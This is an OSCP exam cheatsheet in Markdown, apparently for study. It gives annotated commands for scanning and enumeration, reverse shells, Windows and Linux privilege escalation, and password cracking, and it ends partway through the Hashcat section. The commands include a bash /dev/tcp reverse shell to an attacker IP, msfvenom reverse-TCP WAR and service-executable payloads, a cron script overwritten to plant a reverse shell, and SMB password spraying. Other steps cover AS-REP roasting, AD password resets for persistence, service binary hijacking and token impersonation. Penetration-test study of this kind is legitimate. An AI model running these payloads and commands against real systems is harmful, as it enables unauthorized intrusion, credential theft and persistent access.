# OSCP Cheatsheet

## Table of Contents

- [Scanning & Enumeration](#scanning--enumeration)
  - [Nmap Basics](#nmap-basics)
  - [Service Enumeration](#service-enumeration)
    - [SMB](#smb)
    - [Active Directory](#active-directory)
    - [NFS](#nfs)
    - [FTP](#ftp)
    - [Web/HTTP](#webhttp)
- [Reverse Shells](#reverse-shells)
  - [Bash Reverse Shell](#bash-reverse-shell)
  - [Msfvenom JSP WAR Reverse Shell](#msfvenom-jsp-war-reverse-shell)
- [Remote Access](#remote-access)
  - [Windows Remote Management (WinRM)](#windows-remote-management-winrm)
  - [Meterpreter Session Basics](#meterpreter-session-basics)
- [Privilege Escalation](#privilege-escalation)
  - [Linux](#linux)
    - [SUID Files](#suid-files)
    - [Linux Capabilities](#linux-capabilities)
    - [Cron Jobs](#cron-jobs)
    - [Overwrite Writable Cron Script](#overwrite-writable-cron-script)
    - [Writable Directories](#writable-directories)
  - [Windows](#windows)
    - [PowerUp.ps1](#powerupps1)
    - [Interpreting PowerUp Output](#interpreting-powerup-output)
    - [Msfvenom Service Executable and Restart](#msfvenom-service-executable-and-restart)
    - [Token Impersonation (Incognito)](#token-impersonation-incognito)
    - [Potato Attacks](#potato-attacks)
    - [Windows Privilege Escalation Checklist](#windows-privilege-escalation-checklist)
- [Password Cracking](#password-cracking)
  - [John the Ripper](#john-the-ripper)
  - [Hashcat](#hashcat)
  - [Unshadow](#unshadow)
  - [Hydra](#hydra)

---

## Scanning & Enumeration

### Nmap Basics

* **SYN Stealth Scan (Default)** - Fast and stealthy TCP port scan that doesn't complete the TCP handshake

```bash
nmap -sS <target>
```

* `-sS`: SYN scan (also called half-open scan) - sends SYN packets without completing the handshake
* Default scan type when run as root/administrator
* Fast and relatively stealthy (doesn't complete TCP connections)
* Requires root/administrator privileges to craft raw packets
* Most common scan type for initial reconnaissance

* **TCP Connect Scan** - Completes full TCP handshake, works without root privileges

```bash
nmap -sT <target>
```

* `-sT`: TCP connect scan - completes full TCP three-way handshake
* Default scan type when run as non-root user
* Slower than SYN scan but doesn't require special privileges
* More likely to be logged by target systems
* Use when you don't have root access

* **UDP Scan** - Scans UDP ports (slower than TCP scans)

```bash
nmap -sU <target>
```

* `-sU`: UDP port scan
* Much slower than TCP scans (UDP is connectionless)
* Often combined with TCP scan: `nmap -sS -sU <target>`
* Common UDP ports: 53 (DNS), 67/68 (DHCP), 161 (SNMP), 123 (NTP)

* **NULL Scan** - Sends packets with no flags set (stealth scan)

```bash
nmap -sN <target>
```

* `-sN`: NULL scan - sends packets with no TCP flags set
* Stealth scan technique (may bypass some firewalls)
* Requires root privileges
* Works on systems that don't follow RFC 793 strictly

* **FIN Scan** - Sends packets with only FIN flag set (stealth scan)

```bash
nmap -sF <target>
```

* `-sF`: FIN scan - sends packets with only FIN flag set
* Stealth scan technique
* Requires root privileges
* Similar to NULL scan, may bypass some firewalls

* **Xmas Scan** - Sends packets with FIN, PSH, and URG flags set (stealth scan)

```bash
nmap -sX <target>
```

* `-sX`: Xmas scan - sends packets with FIN, PSH, and URG flags set (like a Christmas tree)
* Stealth scan technique
* Requires root privileges
* Named "Xmas" because the flags are "lit up" like a Christmas tree

* **Comprehensive Scan** - Combines multiple scan types and options

```bash
nmap -sS -sV -sC -O -p- <target>
```

* `-sS`: SYN scan
* `-sV`: Version detection
* `-sC`: Run default NSE scripts
* `-O`: OS detection
* `-p-`: Scan all 65535 ports (default scans top 1000 ports)
* Comprehensive scan for thorough enumeration

* **Version Detection Scan** - Probes open ports to determine service/version information

```bash
nmap -sV <target>
```

* `-sV`: Enables version detection, which probes open ports to determine what service and version is running on them

* **Ping Sweep (Network Discovery)** - Discovers live hosts on a network without port scanning

```bash
sudo nmap -sn ip/24
```

* `-sn`: Ping scan (skip port scan) - only checks if hosts are up, doesn't scan ports
* `ip/24`: Network range in CIDR notation (e.g., `10.10.10.0/24` scans 10.10.10.1-254)
* Requires root/administrator privileges (`sudo`) for ICMP ping and ARP requests
* Fast network discovery technique to identify active hosts before port scanning
* Uses ICMP echo requests, TCP SYN to port 443, TCP ACK to port 80, and ARP requests
* Useful for initial reconnaissance to map out the network topology
* Example: `sudo nmap -sn 10.10.10.0/24` scans all hosts in the 10.10.10.0/24 subnet

### Service Enumeration

#### SMB

* **SMB Share and User Enumeration** - Enumerates SMB shares and users on a target system

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <target>
```

* `-p 445`: Scans port 445 (SMB/CIFS)
* `--script=smb-enum-shares.nse,smb-enum-users.nse`: Runs NSE scripts to enumerate SMB shares and users
* `smb-enum-shares.nse`: Lists available SMB shares on the target
* `smb-enum-users.nse`: Enumerates users on the SMB server (may require credentials)

* **Metasploit SMB Share Enumeration** - Uses Metasploit auxiliary module to enumerate SMB shares

```bash
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS <target>
msf6 auxiliary(scanner/smb/smb_enumshares) > run
```

* `use auxiliary/scanner/smb/smb_enumshares`: Loads the SMB share enumeration auxiliary module
* `set RHOSTS <target>`: Sets the target IP address or range
* `run`: Executes the module to enumerate SMB shares

* **SMB Share Enumeration** - Lists all available SMB shares on a target without authentication

```bash
smbclient -L //<target> -N
```

* `smbclient`: Command-line SMB/CIFS client for accessing SMB shares
* `-L`: List flag - enumerates all available shares without connecting to a specific share
* `//<target>`: Specifies the target IP address (e.g., `//10.82.151.31`)
* `-N`: No password flag - attempts null session authentication (no password required)
* Useful for initial enumeration to discover available shares before attempting to access them
* Works when anonymous/null session access is enabled on the SMB server

* **SMB Client Connection** - Connects to an SMB share using smbclient

```bash
smbclient //<target>/<share>
```

* `smbclient`: Command-line SMB/CIFS client for accessing SMB shares
* `//<target>/<share>`: Specifies the target IP and share name (e.g., `//10.81.182.140/anonymous`)
* Once connected, use commands like `ls`, `get <file>`, `put <file>`, `cd <directory>`, `exit`

* **SMB Recursive Download** - Downloads files recursively from an SMB share

```bash
smbget -R smb://<target>/<share>
```

* `smbget`: Utility to download files from SMB shares
* `-R`: Recursive flag - downloads all files and subdirectories
* `smb://<target>/<share>`: Specifies the target IP and share name (e.g., `smb://10.81.182.140/anonymous`)

* **SMB Brute Force with CrackMapExec** - Performs brute force attack against SMB service using username list and password

```bash
nxc smb 10.82.151.31 -d thm.corp -u users.txt -p 'ResetMe123!' --continue-on-success
```

* `nxc`: CrackMapExec (NetExec) - network security tool for penetration testing
* `smb`: Target protocol (SMB/CIFS)
* `10.82.151.31`: Target IP address
* `-d thm.corp`: Domain name for authentication (optional - use when targeting domain-joined systems)
* `-u users.txt`: Username wordlist file (use `-u username` for single user)
* `-p 'ResetMe123!'`: Password to test (use `-P passwords.txt` for password wordlist)
* `--continue-on-success`: Continue testing even after finding valid credentials
* **Works with both**: Samba servers (Linux/Unix) and Windows SMB servers (standalone or Active Directory)
* Useful for password spraying attacks and credential enumeration
* Can also enumerate shares, sessions, and logged-in users with valid credentials

#### Active Directory

* **SID Enumeration with Impacket** - Enumerates Security Identifiers (SIDs) and users/groups on a Windows domain controller

```bash
lookupsid.py <domain>/<username>@<target>
```

* `lookupsid.py`: Impacket tool for SID enumeration via MS-RPC
* `<domain>/<username>@<target>`: Authentication credentials and target (e.g., `thm.corp/guest@10.82.151.31`)
* Requires valid domain credentials (often works with guest account or null session)
* Enumerates domain SID and all users, groups, and aliases in the Active Directory domain
* Output includes RID (Relative Identifier) and account type (SidTypeUser, SidTypeGroup, SidTypeAlias)
* Useful for discovering all domain users and groups for further enumeration
* Can reveal hidden or non-standard user accounts that might not appear in other enumeration methods
* **Note**: This tool is specific to Active Directory/Windows Domain Controllers
* Example: `lookupsid.py thm.corp/guest@10.82.151.31`

* **AS-REP Roasting with Impacket** - Attempts to retrieve Kerberos AS-REP tickets for users who don't require pre-authentication

```bash
GetNPUsers.py <domain>/ -no-pass -usersfile <users.txt> -dc-ip <target>
```

* `GetNPUsers.py`: Impacket tool for AS-REP Roasting attack
* `<domain>/`: Domain name (e.g., `thm.corp/`)
* `-no-pass`: No password flag - uses null session/anonymous authentication
* `-usersfile <users.txt>`: File containing list of usernames to test (one per line)
* `-dc-ip <target>`: IP address of the Domain Controller
* **AS-REP Roasting**: Attacks users with "Do not require Kerberos preauthentication" enabled
* If a user has this option enabled, retrieves an AS-REP ticket containing an encrypted hash
* The hash can be cracked offline using tools like `hashcat` or `john` to recover the password
* **No credentials required** - works with anonymous/null session access
* Output format: `$krb5asrep$23$username@DOMAIN:hash` (can be cracked with hashcat mode 18200 or john)
* Example: `GetNPUsers.py thm.corp/ -no-pass -usersfile users.txt -dc-ip 10.82.151.31`

* **Reset User Password and Enable Account (PowerShell)** - Resets a user's password and enables their account in Active Directory

```powershell
Set-ADAccountPassword -Identity <username> -Reset -NewPassword (ConvertTo-SecureString '<password>' -AsPlainText -Force)
Set-ADUser -Identity <username> -Enabled $true
```

* `Set-ADAccountPassword`: PowerShell cmdlet to reset a user's password in Active Directory
* `-Identity <username>`: Username of the account to modify (e.g., `Darla_Winters`)
* `-Reset`: Resets the password (forces password change)
* `-NewPassword (ConvertTo-SecureString ...)`: Sets the new password (must be converted to SecureString)
* `-AsPlainText -Force`: Allows plaintext password input (required for ConvertTo-SecureString)
* `Set-ADUser -Identity <username> -Enabled $true`: Enables a disabled user account
* **Requires**: Domain Admin privileges or Account Operator permissions
* **Use cases**:
  * Post-exploitation: After gaining Domain Admin access, reset passwords to maintain persistence
  * Privilege escalation: Enable disabled accounts or reset passwords of accounts you've compromised
  * Lateral movement: Reset passwords of other user accounts to expand access
* **Note**: These commands must be run on a Domain Controller or a machine with RSAT (Remote Server Administration Tools) installed
* Example: `Set-ADAccountPassword -Identity Darla_Winters -Reset -NewPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)`

* **LDAP Anonymous Enumeration** - Enumerates Active Directory via LDAP using anonymous/null session

```bash
ldapsearch -x -H ldap://<target> -b "dc=<domain>,dc=<tld>" > ldapsearch.txt
```

* `ldapsearch`: Command-line LDAP search utility
* `-x`: Simple authentication (uses anonymous bind if no credentials provided)
* `-H ldap://<target>`: LDAP server URI (e.g., `ldap://10.10.161.74`)
* `-b "dc=<domain>,dc=<tld>"`: Base DN (Distinguished Name) for search (e.g., `"dc=thm,dc=local"`)
* `> ldapsearch.txt`: Outputs results to a file for analysis
* **LDAP (Lightweight Directory Access Protocol)**: Primary protocol used by Active Directory for directory queries
* Enumerates users, groups, computers, organizational units, and other AD objects
* **Works with anonymous access** when null session/anonymous LDAP binds are allowed
* Output includes detailed information about all objects in the directory (usernames, groups, descriptions, etc.)
* Useful for discovering domain structure, user accounts, group memberships, and service accounts
* **Common base DNs**:
  * Single domain: `"dc=thm,dc=local"`
  * Subdomain: `"dc=subdomain,dc=thm,dc=local"`
* Example: `ldapsearch -x -H ldap://10.10.161.74 -b "dc=thm,dc=local" > ldapsearch.txt`

#### NFS

* **NFS Share Enumeration** - Enumerates NFS shares, lists contents, and shows filesystem statistics

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <target>
```

* `-p 111`: Scans port 111 (rpcbind - port mapper service used by NFS)
* `--script=nfs-ls,nfs-statfs,nfs-showmount`: Runs NSE scripts to enumerate NFS shares
* `nfs-ls.nse`: Lists files and directories in exported NFS shares with permissions, UIDs, GIDs, and timestamps
* `nfs-statfs.nse`: Shows filesystem statistics (disk space, usage percentage, max file size, etc.)
* `nfs-showmount.nse`: Lists all exported NFS shares on the target

* **Mount NFS Share** - Mounts an NFS share locally to explore its contents

```bash
mkdir /tmp/nfs_mount
mount -t nfs <target>:/<share> /tmp/nfs_mount
cd /tmp/nfs_mount
ls -la
```

* `mkdir /tmp/nfs_mount`: Creates a local directory to mount the NFS share
* `mount -t nfs`: Mounts an NFS filesystem
* `<target>:/<share>`: Specifies the target IP and exported share path (e.g., `10.81.182.140:/var`)
* `/tmp/nfs_mount`: Local mount point directory
* After mounting, explore the share with standard Linux commands (`ls`, `cat`, `find`, etc.)

* **Unmount NFS Share** - Unmounts a mounted NFS share

```bash
umount /tmp/nfs_mount
```

* `umount`: Unmounts a filesystem from the mount point

#### FTP

* **FTP Connection with Netcat** - Connects to FTP server using netcat to interact with the service

```bash
nc <target> 21
```

* `nc`: Netcat - network utility for reading from and writing to network connections
* `<target>`: Target IP address (e.g., `10.81.182.140`)
* `21`: FTP port number
* After connecting, you can interact with the FTP server directly (try `USER anonymous`, `PASS anonymous`, `HELP`, etc.)

* **FTP Client Connection** - Connects to FTP server using ftp client

```bash
ftp <target>
```

* `ftp`: FTP client command-line tool
* `<target>`: Target IP address (e.g., `10.81.182.140`)
* Common FTP commands: `ls`, `cd <directory>`, `get <file>`, `put <file>`, `binary`, `ascii`, `passive`, `quit`

* **General FTP Client Commands** - Common interactive commands for enumeration and file transfer

```bash
ftp <target>
# Name: <username>
# Password: <password>
ls
cd <directory>
get <file>
put <file>
binary
passive
bye
```

* Use `ls` to list directories and `cd <directory>` to move through remote paths
* Use `get <file>` to download and `put <file>` to upload
* Use `binary` for non-text files and `passive` when active mode data connections fail
* Use `bye` or `quit` to close the session cleanly

* **FTP Anonymous Login** - Attempts anonymous login to FTP server

```bash
ftp <target>
# When prompted:
# Name: anonymous
# Password: anonymous (or press Enter)
```

* Many FTP servers allow anonymous access with username `anonymous` and any password (or blank)

* **FTP Enumeration with Nmap** - Enumerates FTP service and attempts anonymous login

```bash
nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-syst <target>
```

* `-p 21`: Scans port 21 (FTP)
* `--script=ftp-anon,ftp-bounce,ftp-syst`: Runs NSE scripts to enumerate FTP
* `ftp-anon.nse`: Checks if anonymous FTP login is allowed
* `ftp-bounce.nse`: Checks for FTP bounce attack vulnerability
* `ftp-syst.nse`: Retrieves system information from FTP server

#### Web/HTTP

* **Directory Brute Force with Gobuster** - Enumerates directories and files on a web server using wordlist

```bash
gobuster dir -u <http://target> -w /usr/share/wordlists/dirb/big.txt
```

* `gobuster`: Fast directory/file brute-forcing tool written in Go
* `dir`: Directory/file brute-forcing mode (use `dns` for subdomain enumeration, `vhost` for virtual hosts)
* `-u <http://target>`: Target URL (e.g., `http://10.201.64.95/`)
* `-w /usr/share/wordlists/dirb/big.txt`: Wordlist file to use for brute-forcing
* **Common wordlists**:
  * `/usr/share/wordlists/dirb/big.txt` - Large wordlist (20k+ entries)
  * `/usr/share/wordlists/dirb/common.txt` - Common directories (4k+ entries)
  * `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` - Medium wordlist
  * `/usr/share/wordlists/dirb/small.txt` - Small wordlist (900+ entries)
* **Common options**:
  * `-x <extensions>`: File extensions to search for (e.g., `-x php,txt,html,js`)
  * `-t <threads>`: Number of concurrent threads (default: 10)
  * `-k`: Skip SSL certificate verification (for HTTPS)
  * `-s <status>`: Status codes to show (e.g., `-s 200,204,301,302,307,401,403`)
  * `-q`: Quiet mode - minimal output
  * `-o <file>`: Output results to file
* Useful for discovering hidden directories, files, and web applications
* Example: `gobuster dir -u http://10.201.64.95/ -w /usr/share/wordlists/dirb/big.txt -x php,txt,html`

* **Start Python HTTP Server** - Serves files from the current directory over HTTP

```bash
python3 -m http.server 8000
```

* `python3 -m http.server 8000`: Starts a simple web server on port 8000
* Serves the current directory contents over HTTP
* Access from browser or tools at: `http://<attacker-ip>:8000`

---

## Reverse Shells

### Bash Reverse Shell

* **Bash Reverse Shell** - Creates a reverse shell connection back to the attacker's machine using bash

```bash
bash -i >& /dev/tcp/{ATTACKER-IP}/{PORT} 0>&1
```

* `bash -i`: Starts an interactive bash shell
* `>& /dev/tcp/{ATTACKER-IP}/{PORT}`: Redirects stdout and stderr to a TCP connection to the attacker's IP and port
* `0>&1`: Redirects stdin (file descriptor 0) to stdout (file descriptor 1), completing the bidirectional connection
* Replace `{ATTACKER-IP}` with your attacking machine's IP address (e.g., `10.10.10.5`)
* Replace `{PORT}` with the port you're listening on (e.g., `4444`)
* **On attacker machine**, set up a listener first: `nc -lvnp <PORT>` or `rlwrap nc -lvnp <PORT>` (for better shell interaction)
* Example: `bash -i >& /dev/tcp/10.10.10.5/4444 0>&1`
* Works on systems with bash and `/dev/tcp` support (most Linux systems)

### Msfvenom JSP WAR Reverse Shell

* **Msfvenom JSP/WAR reverse shell** - Builds a `.war` web archive containing a JSP reverse TCP payload (e.g. Tomcat deployment)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o reverse.war
```

* `-p java/jsp_shell_reverse_tcp`: JSP reverse TCP shell payload
* `LHOST` / `LPORT`: Your listener IP and port
* `-f war`: Output as a WAR file for Java servlet containers
* `-o reverse.war`: Output filename
* Start a listener before the app runs the payload (e.g. `nc -lvnp <PORT>`), then deploy or trigger the WAR as the scenario allows

---

## Remote Access

### Windows Remote Management (WinRM)

* **WinRM Connection with Evil-WinRM** - Connects to Windows Remote Management service for interactive shell access

```bash
evil-winrm -i <target> -u <username> -p '<password>'
```

* `evil-winrm`: Ruby-based tool for connecting to Windows Remote Management (WinRM) service
* `-i <target>`: Target IP address or hostname
* `-u <username>`: Username for authentication
* `-p '<password>'`: Password for authentication
* **WinRM (Windows Remote Management)**: Microsoft protocol for remote management of Windows systems
* Provides interactive PowerShell-like shell on Windows targets
* **Common ports**: 5985 (HTTP) and 5986 (HTTPS)
* **Use cases**:
  * Post-exploitation: After obtaining Windows credentials, use WinRM for persistent access
  * Lateral movement: Access other Windows systems in the network
  * Interactive shell: Better than reverse shells for Windows (PowerShell environment, file upload/download)
* **Common options**:
  * `-S`: Use SSL/TLS (HTTPS) - connects to port 5986
  * `-P <port>`: Specify custom port (default: 5985 for HTTP, 5986 for HTTPS)
  * `-s <script_path>`: Execute a PowerShell script on the target
  * `-e <exe_path>`: Upload and execute an executable
  * `-d <directory>`: Set base directory for file uploads/downloads
* **File operations** (once connected):
  * `upload <local_file>`: Upload file to target
  * `download <remote_file>`: Download file from target
  * `cd`, `ls`, `pwd`: Navigate filesystem
  * `Invoke-Binary`: Execute uploaded binaries
* Example: `evil-winrm -i 10.10.161.74 -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!'`

### Meterpreter Session Basics

* **Upload / download** - Transfer files between your machine and the target

```text
upload /path/on/kali/file.exe C:\\Windows\\Temp\\file.exe
download C:\\Users\\user\\Desktop\\note.txt /tmp/note.txt
```

* **System shell (cmd)** - Spawns a regular Windows shell from the session

```text
shell
```

* **PowerShell from Meterpreter** - Load the extension, then open an interactive PowerShell session

```text
load powershell
powershell_shell
```

* **Leaving nested shells** - Type `exit` to leave `powershell_shell` or `shell` and return to the `meterpreter >` prompt
* **Background session** - `background` (or `bg`) sends the session to the background so you can use other Metasploit modules; `sessions -i <id>` to reattach
* **End the session** - `exit` from the `meterpreter >` prompt closes that Meterpreter session (use `background` first if you only want to step out)

---

## Privilege Escalation

### Linux

#### SUID Files

* **Find SUID Files** - Searches for files with SUID (Set User ID) bit set, which can be exploited for privilege escalation

```bash
find / -perm -u=s -type f 2>/dev/null
```

* `find /`: Searches from root directory
* `-perm -u=s`: Finds files with SUID bit set (executes with owner's privileges)
* `-type f`: Only searches for files (not directories)
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
* SUID files run with the privileges of the file owner, which can be exploited if the owner is root
* Common exploitable SUID binaries: `find`, `nmap`, `vim`, `nano`, `less`, `more`, `cp`, `mv`, etc.

* **Find SUID Files (Detailed Listing)** - Searches for SUID files with detailed file information to verify specific binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

* `find /`: Searches from root directory
* `-type f`: Only searches for files (not directories)
* `-perm -04000`: Finds files with SUID bit set using octal notation (04000 = SUID bit)
* `-ls`: Provides detailed listing similar to `ls -l` (shows permissions, owner, size, timestamps, etc.)
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
* Use this command to see detailed information about SUID files, including verifying that the nano text editor has the SUID bit set
* More useful when you need detailed information about SUID files (permissions, ownership, size) to identify exploitable binaries

#### Linux Capabilities

* **Find Files with Capabilities** - Searches for files with Linux capabilities set, which can be exploited for privilege escalation

```bash
getcap -r / 2>/dev/null
```

* `getcap`: Command to display capabilities of files
* `-r`: Recursive flag - searches recursively through directories
* `/`: Starting directory (root directory)
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
* Linux capabilities provide fine-grained control over privileges, allowing specific capabilities without full root access
* Files with dangerous capabilities (like `cap_setuid`, `cap_sys_admin`, `cap_dac_override`) can be exploited for privilege escalation
* Common exploitable capabilities: `cap_setuid+ep` (can set UID), `cap_sys_admin+ep` (system administration), `cap_dac_override+ep` (bypass file permissions)

#### Cron Jobs

* **Check System Cron Jobs** - Views system-wide cron jobs that may run with elevated privileges

```bash
cat /etc/crontab
```

* `/etc/crontab`: System-wide crontab file that defines scheduled tasks
* Cron jobs that run as root can be exploited if they execute scripts in writable directories
* Look for cron jobs that run scripts you can modify or that run from directories you have write access to

* **Check User Cron Jobs** - Views user-specific cron jobs

```bash
crontab -l
```

* `crontab -l`: Lists cron jobs for the current user
* Check if any cron jobs run scripts you can modify

* **Check All Cron Directories** - Checks common cron directories for scheduled tasks

```bash
ls -la /etc/cron* /var/spool/cron/crontabs/*
```

* `/etc/cron*`: System cron directories (`/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, etc.)
* `/var/spool/cron/crontabs/*`: User-specific crontab files
* Look for scripts referenced in cron jobs that are writable or in writable directories

* **Find Writable Cron Scripts** - Searches for writable scripts referenced in cron jobs

```bash
find /etc/cron* -type f -perm -0002 2>/dev/null
```

* `find /etc/cron*`: Searches in cron directories
* `-type f`: Only searches for files
* `-perm -0002`: Finds files with world-writable permissions (anyone can modify)
* `2>/dev/null`: Suppresses error messages
* If a cron job runs a world-writable script, you can modify it to execute commands as the cron job's user (often root)

* **Check Cron Job Permissions** - Lists cron files with detailed permissions

```bash
ls -la /etc/cron* /var/spool/cron/crontabs/* 2>/dev/null
```

* Shows detailed file permissions, ownership, and timestamps
* Helps identify which cron jobs run as root and which scripts they execute
* Look for scripts in directories you have write access to (e.g., `/tmp`, `/var/tmp`, user home directories)

#### Overwrite Writable Cron Script

If a cron job runs a script you can write to:

```bash
# Check permissions
ls -la /home/user/script.sh

# Overwrite with reverse shell (use echo, NOT vi)
echo '#!/bin/bash' > /home/user/script.sh
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> /home/user/script.sh

# Start listener and wait for cron execution
nc -lvnp <PORT>
```

Note: use `>>` to append, `>` to overwrite.

#### Writable Directories

* **Find Writable Directories** - Searches for writable directories that may be exploitable for privilege escalation

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

* `find / -writable`: Finds all writable files and directories starting from root
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
* `cut -d "/" -f 2,3`: Extracts the first two directory levels (e.g., `/tmp`, `/var/tmp`, `/home/user`)
* `grep -v proc`: Excludes `/proc` directory (virtual filesystem, not useful for exploitation)
* `sort -u`: Sorts and shows only unique directory paths
* Writable directories can be exploited if:
  * Cron jobs execute scripts from these directories
  * PATH manipulation (placing malicious binaries in writable directories in PATH)
  * Log file manipulation (if log files are in writable directories)
  * Configuration file modification (if config files are writable)
* Common writable directories: `/tmp`, `/var/tmp`, `/dev/shm`, user home directories, `/opt`, `/var/www`

* **PATH Manipulation** - Modifies the PATH environment variable to include a writable directory for privilege escalation

```bash
export PATH=/tmp:$PATH
```

* `export PATH=/tmp:$PATH`: Prepends `/tmp` to the beginning of the PATH environment variable
* `/tmp`: Writable directory (can be any writable directory like `/var/tmp`, `/home/user`, etc.)
* `:$PATH`: Appends the original PATH after the new directory
* **Exploitation scenario**: If a SUID binary or cron job runs a command without an absolute path (e.g., `ls` instead of `/bin/ls`), it will search directories in PATH order
* **Steps to exploit**:
  1. Create a malicious binary with the same name as a command (e.g., `ls`, `cat`, `python`)
  2. Place it in the writable directory (e.g., `/tmp/ls`)
  3. Make it executable: `chmod +x /tmp/ls`
  4. Export PATH: `export PATH=/tmp:$PATH`
  5. When the SUID binary or cron job runs the command, it will execute your malicious binary with elevated privileges
* **Check for exploitable binaries**: Look for SUID binaries or cron jobs that call commands without absolute paths

### Windows

#### PowerUp.ps1

* **PowerUp** (PowerSploit) enumerates common Windows privilege-escalation weaknesses. **Dot-source** the script so functions stay in your current PowerShell session—`.\PowerUp.ps1` alone runs in a child scope and may not define `Invoke-AllChecks` where you need it.

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

* `. .\PowerUp.ps1`: Leading dot + space = dot-source (loads script into the current session)
* `Invoke-AllChecks`: Runs PowerUp’s checks and prints findings (weak services, unquoted paths, writable paths, etc.)

#### Interpreting PowerUp Output

* **Example** (vulnerable service — unquoted path + modifiable component):

```text
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```

* **Why this points to exploitation**
  * **Check: Unquoted Service Paths** — The service binary path contains spaces and is not wrapped in quotes. Windows parses the path left to right and may execute `C:\Program.exe` (or another early component) if a malicious binary exists there, before the real path.
  * **ModifiablePath** — Shows a folder low-priv users can write to (`BUILTIN\Users` with `AppendData/AddSubdirectory` on `C:\` in this example). If any segment of the service path is under a writable directory, you can drop a payload with the right name so the service starts your code.
  * **StartName: LocalSystem** — The service runs as **NT AUTHORITY\SYSTEM** when started, so a successful hijack or binary replacement yields **SYSTEM**.
  * **CanRestart: True** — You can `net stop` / `net start` the service (if allowed) to reload the binary and trigger your payload without a reboot.
  * **AbuseFunction** — PowerSploit’s suggested next step (e.g. `Write-ServiceBinary`) replaces or hijacks the service binary; use only on systems you are authorized to test.

#### Msfvenom Service Executable and Restart

* **Build a Windows service-friendly executable** — Use `exe-service` so the payload is suitable to run as a service binary (pair with a handler for the payload you choose).

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe-service -o payload.exe
```

* Use `windows/meterpreter/reverse_tcp` (32-bit) instead of `windows/x64/...` if the target service is 32-bit only
* Transfer `payload.exe` to the target, **replace** the legitimate service executable (same path and filename as in **Path**), or place it at a hijack point PowerUp identified
* **Stop the service** (*Fermare il servizio*) so the file on disk can be overwritten:

```cmd
net stop AdvancedSystemCareService9
```

* **Start the service** (*Far ripartire il servizio — esegue il tuo payload*) after swapping the binary:

```cmd
net start AdvancedSystemCareService9
```

* Replace `AdvancedSystemCareService9` with the **ServiceName** from PowerUp or `sc qc <ServiceName>` output

#### Token Impersonation (Incognito)

* **When to try it** - If `whoami /priv` shows `SeImpersonatePrivilege` (or `SeAssignPrimaryTokenPrivilege`), token impersonation is a top Windows privesc path.

```text
whoami /priv
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
getuid
```

* `load incognito`: Loads Meterpreter incognito extension
* `list_tokens -g`: Lists available delegation/impersonation group tokens
* `impersonate_token ...`: Steals and applies the selected token
* If `getuid` does not immediately show SYSTEM/admin access in practice, migrate to a suitable privileged process (`ps` + `migrate <pid>`)

#### Potato Attacks

* **Use case** - Same core primitive (`SeImpersonatePrivilege`), often used when classic Incognito token theft is not enough or not available on modern hosts.
* Common tooling:
  * `PrintSpoofer`
  * `RoguePotato`
  * `GodPotato`
* General workflow:
  1. Confirm privilege: `whoami /priv`
  2. Transfer exploit binary to target
  3. Execute exploit with a payload command (reverse shell or local admin command)
  4. Catch elevated shell/token and verify with `whoami`
* Choose tool based on OS/build and patch level; not every Potato variant works everywhere.

#### Windows Privilege Escalation Checklist

```text
whoami /priv          -> SeImpersonatePrivilege? -> Token impersonation / Potato
winPEAS / PowerUp     -> service misconfig, unquoted paths, weak perms
sc qc <service>       -> inspect binary path, start account, startup type
accesschk / icacls    -> weak service/binary/folder permissions
```

* Fast decision flow:
  * `SeImpersonatePrivilege` present -> test Incognito/Potato first
  * Weak service config/ACL found -> service binary/path abuse
  * Always verify context after each step with `whoami` and `whoami /groups`

---

## Password Cracking

### John the Ripper

* **Crack Password Hash** - Cracks password hashes using John the Ripper with a wordlist

```bash
john --format=crypt --wordlist=rockyou.txt hash.txt
```

* `john`: John the Ripper password cracking tool
* `--format=crypt`: Specifies the hash format (crypt format for traditional Unix password hashes)
* `--wordlist=rockyou.txt`: Uses the rockyou.txt wordlist (commonly located in `/usr/share/wordlists/rockyou.txt`)
* `hash.txt`: File containing the password hash(es) to crack
* Common hash formats: `crypt` (Unix), `md5crypt`, `sha512crypt`, `NT` (Windows), `raw-md5`, `raw-sha1`, etc.
* To identify hash format automatically, use: `john --format=auto hash.txt` or `hashid hash.txt`

* **Crack Windows NT Hashes** - Cracks Windows NT password hashes (from SAM database)

```bash
john --format=NT --wordlist=rockyou.txt hash.txt
```

* `--format=NT`: Specifies NT hash format (Windows NTLM/NT hashes)
* `--wordlist=rockyou.txt`: Uses the rockyou.txt wordlist
* `hash.txt`: File containing Windows NT hashes (typically extracted from Windows SAM database)
* **Usage scenario**: After extracting Windows password hashes from SAM database or other Windows systems
* Windows NT hashes are typically 32-character hexadecimal strings (MD4 hash of the password)
* Can also use `--format=NT` for NTLM hashes (same format)

### Hashcat

* **Crack Raw MD5 Hash (Wordlist Attack)** - Cracks a raw MD5 hash using a dictionary

```bash
hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C /usr/share/wordlists/rockyou.txt --show
```

* `-a 0`: Straight attack mode (wordlist)
* `-m 0`: Raw MD5 hash mode
